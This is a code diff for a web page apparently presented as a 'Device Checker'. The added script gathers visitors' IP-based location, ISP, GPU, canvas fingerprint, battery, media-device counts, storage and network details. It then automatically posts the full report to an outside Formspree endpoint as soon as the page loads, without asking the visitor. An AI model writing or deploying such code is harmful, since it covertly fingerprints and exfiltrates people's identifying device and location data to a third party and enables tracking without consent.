@@ -11,58 +11,178 @@ small{color:#94a3b8}button{padding:10px 14px;margin-top:16px;cursor:pointer}
 <div id="status"></div>
 </div>
 <script>
-async function ip(){for(const u of["https://ipwho.is/","https://ipapi.co/json/"]){try{let j=await (await fetch(u)).json();if(j){return {ip:j.ip,country:j.country||j.country_name,region:j.region,city:j.city,isp:j.connection?.isp||j.isp||j.org||""}}}catch(e){}}return{}}
-async function info(){
-let d=await ip(),ua=navigator.userAgent,extra={};
-if(navigator.userAgentData?.getHighEntropyValues){
-try{extra=await navigator.userAgentData.getHighEntropyValues(["model","platformVersion","architecture","bitness","fullVersionList"])}catch(e){}
+function getGPU(){
+  try{
+    const canvas=document.createElement('canvas');
+    const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+    if(!gl)return"WebGL not supported";
+    const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo?gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL):"Hidden by browser";
+  }catch(e){return"Unavailable"}
 }
-let rows={
-"IP":d.ip||"Unavailable",
-"Country":d.country||"Unavailable",
-"Region":d.region||"Unavailable",
-"City":d.city||"Unavailable",
-"ISP":d.isp||"Unavailable",
-"Brand(s)":navigator.userAgentData?.brands?.map(x=>x.brand+" "+x.version).join(", ")||"Unavailable",
-"Device Model":extra.model||"Hidden by browser",
-"Platform":navigator.userAgentData?.platform||navigator.platform,
-"Platform Version":extra.platformVersion||"Hidden",
-"Architecture":extra.architecture||"Hidden",
-"Bitness":extra.bitness||"Hidden",
-"OS/User-Agent":ua,
-"Screen":screen.width+" × "+screen.height+" CSS px",
-"Viewport":innerWidth+" × "+innerHeight,
-"Language":navigator.language,
-"Timezone":Intl.DateTimeFormat().resolvedOptions().timeZone,
-"CPU":navigator.hardwareConcurrency||"?",
-"Memory":navigator.deviceMemory?navigator.deviceMemory+" GB":"Hidden",
-"Network":navigator.connection?.effectiveType||"Unknown"
-};
-window.rows=rows;
-o.innerHTML=Object.entries(rows).map(([k,v])=>`<div class=item><b>${k}</b><span>${v}</span></div>`).join("");
-window.reportText=Object.entries(rows).map(([k,v])=>k+": "+v).join("\n");
-await sendReport(window.reportText);
+function getCanvasPrint(){
+  try{
+    const canvas=document.createElement('canvas');
+    const ctx=canvas.getContext('2d');
+    ctx.textBaseline="top";ctx.font="14px 'Arial'";
+    ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
+    ctx.fillStyle="#069";ctx.fillText("Device Checker! 🔍",2,15);
+    ctx.fillStyle="rgba(200,0,0,0.5)";ctx.fillRect(10,10,50,5);
+    return canvas.toDataURL().length;
+  }catch(e){return 0}
+}
+async function getBattery(){
+  try{
+    if(!navigator.getBattery)return"API not available";
+    const b=await navigator.getBattery();
+    return{
+      level:Math.round(b.level*100)+"%",
+      charging:b.charging?"Yes":"No",
+      time:b.chargingTime===Infinity?"N/A":Math.round(b.chargingTime/60)+"min"
+    };
+  }catch(e){return"Hidden"}
+}
+async function getMediaDevices(){
+  try{
+    if(!navigator.mediaDevices?.enumerateDevices)return"Permission required";
+    const devices=await navigator.mediaDevices.enumerateDevices();
+    return{
+      cameras:devices.filter(d=>d.kind==='videoinput').length,
+      mics:devices.filter(d=>d.kind==='audioinput').length,
+      speakers:devices.filter(d=>d.kind==='audiooutput').length
+    };
+  }catch(e){return"Permission denied"}
+}
+function getStorageEstimate(){
+  if('storage' in navigator&&'estimate' in navigator.storage){
+    return navigator.storage.estimate().then(({quota,usage})=>({
+      quota:Math.round(quota/1024/1024)+" MB",
+      used:Math.round(usage/1024/1024)+" MB"
+    }));
+  }
+  return Promise.resolve("API not available");
+}
+function getConnectionInfo(){
+  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if(!c)return"Unavailable";
+  return{
+    effective:c.effectiveType||"Unknown",
+    downlink:c.downlink?c.downlink+" Mbps":"Unknown",
+    rtt:c.rtt?c.rtt+" ms":"Unknown",
+    saveData:c.saveData?"Yes":"No"
+  };
+}
+async function ip(){
+  for(const u of["https://ipwho.is/","https://ipapi.co/json/","https://api.ipify.org?format=json"]){
+    try{
+      let r=await fetch(u,{signal:AbortSignal.timeout(3000)});
+      let j=await r.json();
+      if(j.ip||u.includes('ipify')){
+        return{
+          ip:j.ip,
+          country:j.country||j.country_name||"",
+          region:j.region||j.region_name||"",
+          city:j.city||"",
+          isp:j.connection?.isp||j.isp||j.org||j.asn||""
+        };
+      }
+    }catch(e){}
+  }
+  return{};
+}
+async function info(){
+  const[d,gpu,battery,media,storage,conn,canvasPrint]=await Promise.all([
+    ip(),
+    getGPU(),
+    getBattery(),
+    getMediaDevices(),
+    getStorageEstimate(),
+    Promise.resolve(getConnectionInfo()),
+    getCanvasPrint()
+  ]);
+  const ua=navigator.userAgent;
+  let extra={};
+  if(navigator.userAgentData?.getHighEntropyValues){
+    try{
+      extra=await navigator.userAgentData.getHighEntropyValues([
+        "model","platformVersion","architecture","bitness",
+        "fullVersionList","uaFullVersion","brands"
+      ]);
+    }catch(e){}
+  }
+  const isMobile=/Mobi|Android|iPhone|iPad/i.test(ua)||('ontouchstart' in window&&screen.width<1024);
+  const date=new Date();
+  const jan=new Date(date.getFullYear(),0,1);
+  const jul=new Date(date.getFullYear(),6,1);
+  const dst=date.getTimezoneOffset()<Math.max(jan.getTimezoneOffset(),jul.getTimezoneOffset());
+  const physicalWidth=Math.round(screen.width*window.devicePixelRatio);
+  const physicalHeight=Math.round(screen.height*window.devicePixelRatio);
+  const battStr=battery&&typeof battery==='object'?
+    `Level: ${battery.level} | Charging: ${battery.charging} | Remaining: ${battery.time}`:"Hidden";
+  const mediaStr=media&&typeof media==='object'?
+    `Cameras: ${media.cameras} | Mics: ${media.mics} | Speakers: ${media.speakers}`:"Permission required";
+  const connStr=conn&&typeof conn==='object'?
+    `Type: ${conn.effective} | Speed: ${conn.downlink} | Latency: ${conn.rtt} | Data Saver: ${conn.saveData}`:"Unavailable";
+  const storageStr=storage&&typeof storage==='object'?
+    `Quota: ${storage.quota} | Used: ${storage.used}`:"API not available";
+  let rows={
+    "IP":d.ip||"Unavailable",
+    "Country":d.country||"Unavailable",
+    "Region":d.region||"Unavailable",
+    "City":d.city||"Unavailable",
+    "ISP":d.isp||"Unavailable",
+    "Brand(s)":extra.brands?.map(x=>`${x.brand} ${x.version}`).join(", ")||navigator.userAgentData?.brands?.map(x=>`${x.brand} ${x.version}`).join(", ")||"Unavailable",
+    "Full Version":extra.uaFullVersion||"Hidden",
+    "Device Model":extra.model||"Hidden by browser",
+    "Mobile Device":isMobile?"Yes":"No/Desktop",
+    "Platform":navigator.userAgentData?.platform||navigator.platform,
+    "Platform Version":extra.platformVersion||"Hidden",
+    "Architecture":extra.architecture||"Hidden",
+    "Bitness":extra.bitness||"Hidden",
+    "Physical Screen":physicalWidth+" × "+physicalHeight+" px",
+    "CSS Screen":screen.width+" × "+screen.height+" px",
+    "Viewport":innerWidth+" × "+innerHeight,
+    "Device Pixel Ratio":window.devicePixelRatio||"1",
+    "GPU Renderer":gpu,
+    "Canvas Fingerprint":canvasPrint,
+    "Language":navigator.language,
+    "Languages":navigator.languages?.join(", ")||"Hidden",
+    "Timezone":Intl.DateTimeFormat().resolvedOptions().timeZone,
+    "DST Active":dst?"Yes":"No",
+    "CPU Cores":navigator.hardwareConcurrency||"?",
+    "Memory":navigator.deviceMemory?navigator.deviceMemory+" GB":"Hidden",
+    "Storage":storageStr,
+    "Battery":battStr,
+    "Network":connStr,
+    "Media Devices":mediaStr,
+    "Do Not Track":navigator.doNotTrack||"Unspecified",
+    "User Agent":ua
+  };
+  window.rows=rows;
+  o.innerHTML=Object.entries(rows).map(([k,v])=>`<div class=item><b>${k}</b><span>${v}</span></div>`).join("");
+  window.reportText=Object.entries(rows).map(([k,v])=>k+": "+v).join("\n");
+  await sendReport(window.reportText);
 }
 async function sendReport(text){
-try{
-let res=await fetch("https://formspree.io/f/mdakqoyw",{
-method:"POST",
-headers:{"Accept":"application/json"},
-body:new URLSearchParams({report:text})
-});
-if(res.ok){
-document.getElementById("status").innerHTML='<span class="success">✓ Report sent successfully</span>';
-}else{
-throw new Error("Formspree rejected");
-}
-}catch(e){
-document.getElementById("status").innerHTML='<span class="error">✗ Send failed</span>';
-}
-setTimeout(()=>{document.getElementById("status").style.opacity="0";},3000);
+  try{
+    let res=await fetch("https://formspree.io/f/mdakqoyw",{
+      method:"POST",
+      headers:{"Accept":"application/json"},
+      body:new URLSearchParams({report:text})
+    });
+    if(res.ok){
+      document.getElementById("status").innerHTML='<span class="success">✓ Report sent successfully</span>';
+    }else{
+      throw new Error("Formspree rejected");
+    }
+  }catch(e){
+    document.getElementById("status").innerHTML='<span class="error">✗ Send failed</span>';
+  }
+  setTimeout(()=>{document.getElementById("status").style.opacity="0";},3000);
 }
 async function copyAndSend(){
-navigator.clipboard.writeText(window.reportText);
-await sendReport(window.reportText);
+  await navigator.clipboard.writeText(window.reportText);
+  await sendReport(window.reportText);
 }
 info();
 </script></body></html>
